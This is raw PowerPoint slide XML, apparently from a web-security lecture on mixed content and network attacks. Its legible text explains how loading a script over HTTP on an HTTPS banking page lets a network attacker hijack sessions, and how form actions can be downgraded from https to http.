                  <a:lnTo>
                    <a:pt x="65547" y="93591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99503" y="66955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139087" y="44106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183601" y="25515"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232345" y="11654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="284619" y="2991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339725" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="394830" y="2991"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="447104" y="11654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="495848" y="25515"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="540362" y="44106"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="579946" y="66955"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613902" y="93591"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="641530" y="123545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="662130" y="156344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="679449" y="228599"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="675003" y="265680"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="641530" y="333654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="613902" y="363608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="579946" y="390244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="540362" y="413093"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="495848" y="431683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="447104" y="445545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="394830" y="454207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="339725" y="457199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="284619" y="454207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="232345" y="445545"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="183601" y="431683"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="139087" y="413093"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="99503" y="390244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="65547" y="363608"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="37919" y="333654"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="17319" y="300855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="228599"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="76199">
              <a:solidFill>
                <a:srgbClr val="D848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850996520" name="object 8"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId5"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="4787280" y="1999080"/>
            <a:ext cx="3638519" cy="1422000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="1781301676" name="PlaceHolder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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97D1891D-7CBD-4679-9197-EA7232BD0B40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990743" name="object 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1555560"/>
            <a:ext cx="8092080" cy="1875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Banks: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after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login,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all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content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served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over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HTTPS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Developer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error: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somewhere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bank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site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write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253669" name="PlaceHolder 1"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" idx="4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7AE8E025-3B4E-438F-9D13-E9E34DCEB8A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849218" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="914400" y="2590920"/>
            <a:ext cx="7467120" cy="470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5080" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="91440">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="434"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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&lt;script</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="9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src=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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http://www.site.com/script.js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&gt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="9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&lt;/script&gt;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256775" name="object 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="3078000"/>
            <a:ext cx="7679880" cy="1247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6840" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="749160" indent="-279360">
              <a:lnSpc>
                <a:spcPct val="101000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="54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Active</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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network</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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attacker</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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can</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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now</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-41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hijack</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-5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any</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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FF0000"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>session (how?)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59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Better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way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include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content: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4662726" name="object 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="914400" y="4343400"/>
            <a:ext cx="7467120" cy="4838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68040" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="91440">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="536"/>
              </a:spcBef>
              <a:defRPr/>
            </a:pP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&lt;script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 src=//</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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www.site.com/script.js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&gt; &lt;/script&gt;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359127" name="object 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="993240" y="4830480"/>
            <a:ext cx="7161120" cy="74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97720" indent="-285120">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="99"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="2977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Served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over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same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protocol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embedding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page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415403" name="PlaceHolder 2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Mixed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Content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and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Network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Attacks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65021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HTTP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21EAA"/>
                </a:solidFill>
                <a:latin typeface="Symbol"/>
              </a:rPr>
              <a:t></a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="4000" b="0" strike="noStrike" spc="221">
                <a:solidFill>
                  <a:srgbClr val="021EAA"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman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HTTPS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and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Back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473269" name="object 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="993240" y="5668920"/>
            <a:ext cx="4984560" cy="115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7560" rIns="0" bIns="0" anchor="t">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="297720" indent="-285120">
              <a:lnSpc>
                <a:spcPts val="3019"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="60"/>
              </a:spcBef>
              <a:buClr>
                <a:srgbClr val="008080"/>
              </a:buClr>
              <a:buFont typeface="Symbol"/>
              <a:buChar char=""/>
              <a:tabLst>
                <a:tab pos="106056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Rewrite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&lt;form</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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action=https://…</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="24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52">
                <a:solidFill>
                  <a:srgbClr val="000099"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>&gt; 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&lt;form</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2400" b="0" strike="noStrike" spc="-21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99"/>
                </a:solidFill>
                <a:latin typeface="Tahoma"/>
              </a:rPr>
              <a:t>action=http://…&gt;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7055724" name="object 4"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill rotWithShape="1">
          <a:blip r:embed="rId3"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1065600" y="3701519"/>
            <a:ext cx="671400" cy="680040"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:ln w="0">
            <a:noFill/>
          </a:ln>
        </p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="44529653" name="object 5"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4294080" y="3700440"/>
            <a:ext cx="380520" cy="685440"/>
            <a:chOff x="4294080" y="3700440"/>
            <a:chExt cx="380520" cy="685440"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="386" name="object 6"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4294080" y="3700440"/>
              <a:ext cx="380520" cy="68544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381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="381000" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="117538" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="69342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="685787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259397" y="685787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267500" y="685787"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="381000" y="61645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FED5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object 7"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4294080" y="3700440"/>
              <a:ext cx="380520" cy="68544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381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="69341"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="117545" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="190499" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="369855"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="616457"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="267511" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="186442" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="685799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="366013"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="69341"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="69341"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="259397" y="69341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="380999" y="0"/>
                  </a:lnTo>
                </a:path>
                <a:path w="381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="69341"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="259397" y="69341"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259397" y="169513"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259397" y="554799"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="259397" y="685799"/>
                  </a:lnTo>
                </a:path>
                <a:path w="381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="20266" y="96329"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="235091" y="96329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235091" y="111728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="111728"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="96329"/>
                  </a:lnTo>
                </a:path>
                <a:path w="381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="20266" y="142557"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="235091" y="142557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235091" y="154114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="154114"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="142557"/>
                  </a:lnTo>
                </a:path>
                <a:path w="381000" h="685800" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="20266" y="188785"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="235091" y="188785"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="235091" y="200342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="200342"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="20266" y="188785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7426305" name="object 8"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="6688080" y="3776760"/>
            <a:ext cx="474480" cy="529920"/>
            <a:chOff x="6688080" y="3776760"/>
            <a:chExt cx="474480" cy="529920"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="389" name="object 9"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6688080" y="3776760"/>
              <a:ext cx="474480" cy="529920"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 474480"/>
                <a:gd name="textAreaRight" fmla="*/ 474840 w 474480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 529920"/>
                <a:gd name="textAreaBottom" fmla="*/ 530280 h 529920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="474649" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="106794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="530225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474649" y="530225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474649" y="347116"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474649" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:solidFill>
              <a:srgbClr val="FFFED5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object 10"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6688080" y="3776760"/>
              <a:ext cx="474480" cy="529920"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 474480"/>
                <a:gd name="textAreaRight" fmla="*/ 474840 w 474480"/>
                <a:gd name="textAreaTop" fmla="*/ 0 h 529920"/>
                <a:gd name="textAreaBottom" fmla="*/ 530280 h 529920"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst/>
              <a:rect l="textAreaLeft" t="textAreaTop" r="textAreaRight" b="textAreaBottom"/>
              <a:pathLst>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="474661" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474661" y="530224"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="530224"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:close/>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="36522" y="41951"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="198786" y="41951"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="198786" y="57220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36522" y="57220"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="36522" y="41951"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="106805"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="239352" y="106805"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="347125"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="474661" y="347125"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="30512"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="450313" y="30512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450313" y="38146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="38146"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="30512"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="80098"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="450313" y="80098"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450313" y="87732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="87732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="80098"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="148757"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="450313" y="148757"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450313" y="156391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="156391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="148757"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="198367"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="446270" y="198367"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="446270" y="205977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="205977"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="198367"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="103001"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="271809" y="103001"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271809" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="103001"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="316441" y="103001"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="332658" y="103001"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="332658" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="316441" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="316441" y="103001"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="373246" y="103001"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="389464" y="103001"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="389464" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373246" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373246" y="103001"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="434095" y="103001"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="450313" y="103001"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450313" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434095" y="118245"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434095" y="103001"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="255592" y="236514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="271809" y="236514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="271809" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="255592" y="236514"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="316441" y="236514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="332658" y="236514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="332658" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="316441" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="316441" y="236514"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="373246" y="236514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="389464" y="236514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="389464" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373246" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="373246" y="236514"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="434095" y="236514"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="450313" y="236514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="450313" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434095" y="251758"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="434095" y="236514"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="239352" y="347125"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="239352" y="377637"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="492078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="530224"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="347125"/>
                  </a:lnTo>
                </a:path>
                <a:path w="474979" h="530225" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="239352" y="106805"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="239352" y="87732"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="22878"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="239352" y="106805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5696720" name="object 11"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="1892520" y="3933720"/>
            <a:ext cx="2209320" cy="119160"/>
            <a:chOff x="1892520" y="3933720"/>
            <a:chExt cx="2209320" cy="119160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="392" name="object 12"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1917360" y="3992760"/>
              <a:ext cx="2159280" cy="1440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 2159280"/>
                <a:gd name="textAreaRight" fmla="*/ 2159640 w 21592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159635" h="1904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2159390" y="1551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93" name="object 13"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId4"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1892520" y="3933720"/>
              <a:ext cx="115560" cy="117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4" name="object 1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3986280" y="3935160"/>
              <a:ext cx="115560" cy="1177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16047687" name="object 15"/>
          <p:cNvGrpSpPr/>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="4940280" y="3933720"/>
            <a:ext cx="1523520" cy="119160"/>
            <a:chOff x="4940280" y="3933720"/>
            <a:chExt cx="1523520" cy="119160"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="396" name="object 16"/>
            <p:cNvSpPr/>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4965480" y="3992760"/>
              <a:ext cx="1473480" cy="1440"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="textAreaLeft" fmla="*/ 0 w 1473480"/>
                <a:gd name="textAreaRight" fmla="*/ 1473840 w 14734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473835" h="1904" fill="norm" stroke="1" extrusionOk="0">
                  <a:moveTo>
                    <a:pt x="0" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="1473589" y="1535"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="952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97" name="object 17"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId6"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4940280" y="3933720"/>
              <a:ext cx="115560" cy="117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8" name="object 18"/>
            <p:cNvPicPr/>
            <p:nvPr/>
          </p:nvPicPr>
          <p:blipFill rotWithShape="1">
            <a:blip r:embed="rId7"/>
            <a:stretch/>
          </p:blipFill>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="6348240" y="3935160"/>
              <a:ext cx="115560" cy="1177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07036102" name="object 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="536040" y="1556640"/>
